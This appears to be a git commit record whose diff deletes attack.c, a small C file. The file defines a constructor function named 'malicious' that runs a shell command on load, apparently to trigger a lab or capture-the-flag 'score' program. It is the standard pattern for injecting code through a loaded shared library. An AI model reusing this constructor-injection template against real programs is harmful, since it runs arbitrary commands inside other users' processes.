68eb723c4ce03b2e9cd7ab7662af3034b93dbd1e
pry <pry@GhostBook-Air.home>
2023-11-07 01:19:37 -0500

    Update

--- attack.c
+++
@@ -1,8 +0,0 @@
-#include<stdio.h>
-#include<stdlib.h>
- 
-static void malicious() __attribute__((constructor));
- 
-void malicious() {
-    system("/usr/local/bin/score c9dab298-3a81-42de-ad84-2bb82d40d4ad");
-}
